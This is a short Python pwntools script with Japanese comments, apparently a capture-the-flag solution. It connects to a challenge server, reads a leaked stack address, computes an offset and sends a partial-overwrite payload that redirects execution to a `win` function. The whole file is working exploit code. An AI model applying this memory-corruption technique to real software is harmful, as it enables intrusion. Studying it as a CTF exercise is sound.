from pwn import *

elf = ELF('./chall')
win_addr = elf.symbols['win']

# リモート接続
p = remote('34.170.146.252', 43249)


# alpaca のリークを読む
p.recvuntil(b'[leaked] address of `alpaca`:')
alpaca_addr = int(p.recvline().strip(), 16)

# ローカルで計算した alpaca → name のオフセット
# ※ chall をローカルで実行してリークを比較して求めた値
offset = 0x7fffffffdcb0 - 0x7fffffffdd00

# リモートの name のアドレスを復元
name_addr = alpaca_addr + offset

# payload（partial overwrite）
payload  = b'A'*8                 # スタック上の関数ポインタの前半
payload += p64(win_addr)          # win のアドレスをスタックに置く
payload += b'A'*0x30              # name までの埋め
payload += p64(name_addr)[:2]     # 下位 2 バイトだけ上書き（ここが本質）

p.recvuntil(b'your name>')
p.send(payload)

p.interactive()
